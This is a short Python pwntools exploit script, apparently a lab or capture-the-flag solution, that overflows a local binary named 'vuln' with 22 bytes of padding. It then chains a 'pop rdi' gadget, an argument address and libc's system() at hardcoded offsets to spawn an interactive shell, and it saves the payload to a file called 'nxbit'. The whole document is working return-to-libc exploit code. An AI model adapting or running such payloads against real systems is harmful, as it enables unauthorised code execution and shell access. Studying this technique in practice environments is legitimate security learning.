from struct import *
from pwn import *
context(os = "linux", arch = "amd64")
vuln = process("./vuln")
base = 0x7ffff7dd3000
rdi_add = 0x23c5d + base
system = 0x45880 + base
arg = 0x194882 + base
payload = b''
payload += b'A' * 22
payload += p64(rdi_add)
payload += p64(arg)
payload += p64(system)
vuln.sendline(payload)
vuln.interactive()
file = open("nxbit", "wb")
file.write(payload)